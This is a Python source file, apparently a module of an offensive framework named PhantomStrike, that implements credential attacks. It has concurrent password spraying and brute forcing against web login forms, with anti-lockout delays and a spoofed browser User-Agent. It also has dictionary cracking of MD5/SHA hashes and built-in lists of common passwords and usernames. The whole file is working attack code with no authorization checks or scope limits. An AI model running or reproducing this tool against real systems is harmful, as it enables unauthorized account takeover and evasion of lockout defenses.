"""
PhantomStrike Credential Attack Engine — Multi-threaded brute force,
password spraying, hash cracking, and credential stuffing.
"""
from __future__ import annotations
import asyncio
import hashlib
import itertools
import logging
from datetime import datetime
from typing import Optional

import aiohttp

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.cred")

# Common passwords for spraying
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123", "password1",
    "admin", "letmein", "welcome", "monkey", "1234567890", "login",
    "princess", "passw0rd", "P@ssw0rd", "Password1", "Password123",
    "Admin123", "admin@123", "root", "toor", "test", "guest",
    "changeme", "default", "master", "1q2w3e4r", "qwerty123",
    "Summer2024!", "Winter2024!", "Company123!", "Welcome1!",
]

# Common usernames
COMMON_USERS = [
    "admin", "administrator", "root", "user", "test", "guest",
    "info", "support", "contact", "webmaster", "postmaster",
    "sales", "marketing", "hr", "finance", "manager", "dev",
    "developer", "sysadmin", "operator", "service", "deploy",
]


class CredEngine(BaseModule):
    """Multi-threaded credential attack module."""

    @property
    def name(self) -> str:
        return "phantom-cred"

    @property
    def description(self) -> str:
        return "Credential attacks — brute force, password spray, hash crack"

    @property
    def category(self) -> str:
        return "credential"

    async def _setup(self):
        self._session: Optional[aiohttp.ClientSession] = None

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run credential attacks against target."""
        options = options or {}
        self.status = ModuleStatus.RUNNING
        start_time = datetime.now()
        attack_type = options.get("type", "spray")

        findings = {
            "target": target,
            "valid_credentials": [],
            "weak_hashes": [],
            "attack_type": attack_type,
            "attempts": 0,
        }

        if attack_type == "spray":
            await self._password_spray(target, findings, options)
        elif attack_type == "brute":
            await self._brute_force(target, findings, options)
        elif attack_type == "hash":
            await self._crack_hashes(findings, options)

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation=f"cred_{attack_type}",
            success=True, data=findings,
            findings_count=len(findings["valid_credentials"]) + len(findings["weak_hashes"]),
            start_time=start_time, end_time=datetime.now(),
        )

    async def _password_spray(self, target: str, findings: dict, options: dict):
        """Password spray — try common passwords against known usernames."""
        if not target.startswith("http"):
            target = f"https://{target}"

        login_url = options.get("login_url", f"{target}/login")
        usernames = options.get("usernames", COMMON_USERS)
        passwords = options.get("passwords", COMMON_PASSWORDS[:10])
        username_field = options.get("username_field", "username")
        password_field = options.get("password_field", "password")
        success_indicator = options.get("success_indicator", "dashboard")
        failure_indicator = options.get("failure_indicator", "invalid")

        semaphore = asyncio.Semaphore(options.get("threads", 10))

        self._session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0.0.0"},
        )

        async def try_login(username: str, password: str):
            async with semaphore:
                findings["attempts"] += 1
                try:
                    data = {username_field: username, password_field: password}
                    async with self._session.post(login_url, data=data, allow_redirects=False) as resp:
                        body = await resp.text()
                        status = resp.status

                        # Check for success
                        is_success = (
                            status in (301, 302, 303)  # Redirect after login
                            or (success_indicator and success_indicator.lower() in body.lower())
                        )
                        is_failure = (
                            failure_indicator and failure_indicator.lower() in body.lower()
                        )

                        if is_success and not is_failure:
                            cred = {
                                "username": username,
                                "password": password,
                                "url": login_url,
                                "method": "password_spray",
                            }
                            findings["valid_credentials"].append(cred)
                            await self.event_bus.emit(Event(
                                type=EventType.CRED_FOUND,
                                data=cred, source=self.name, severity="critical",
                            ))
                            logger.info(f"[CRED] 🔑 VALID: {username}:{password}")
                except Exception:
                    pass

        # Spray: one password at a time across all users (avoids lockouts)
        tasks = []
        for password in passwords:
            for username in usernames:
                tasks.append(try_login(username, password))
            # Small delay between password rounds to avoid lockout
            if tasks:
                batch = tasks[:len(usernames)]
                tasks = tasks[len(usernames):]
                await asyncio.gather(*batch)
                await asyncio.sleep(2)  # Anti-lockout delay

        if tasks:
            await asyncio.gather(*tasks)

        if self._session:
            await self._session.close()

    async def _brute_force(self, target: str, findings: dict, options: dict):
        """Brute force a single account with wordlist."""
        # Same as spray but focused on one user with larger wordlist
        options["usernames"] = [options.get("username", "admin")]
        options["passwords"] = options.get("wordlist", COMMON_PASSWORDS)
        options["threads"] = options.get("threads", 20)
        await self._password_spray(target, findings, options)

    async def _crack_hashes(self, findings: dict, options: dict):
        """Crack password hashes using dictionary attack."""
        hashes = options.get("hashes", [])
        wordlist = options.get("wordlist", COMMON_PASSWORDS)
        hash_type = options.get("hash_type", "md5")

        hash_funcs = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha256": hashlib.sha256,
            "sha512": hashlib.sha512,
        }

        hash_func = hash_funcs.get(hash_type, hashlib.md5)

        for target_hash in hashes:
            target_hash_lower = target_hash.lower().strip()
            for word in wordlist:
                computed = hash_func(word.encode()).hexdigest()
                findings["attempts"] += 1
                if computed == target_hash_lower:
                    result = {
                        "hash": target_hash,
                        "plaintext": word,
                        "type": hash_type,
                    }
                    findings["weak_hashes"].append(result)
                    await self.event_bus.emit(Event(
                        type=EventType.HASH_CRACKED,
                        data=result, source=self.name,
                    ))
                    logger.info(f"[CRED] 🔓 CRACKED: {target_hash} → {word}")
                    break
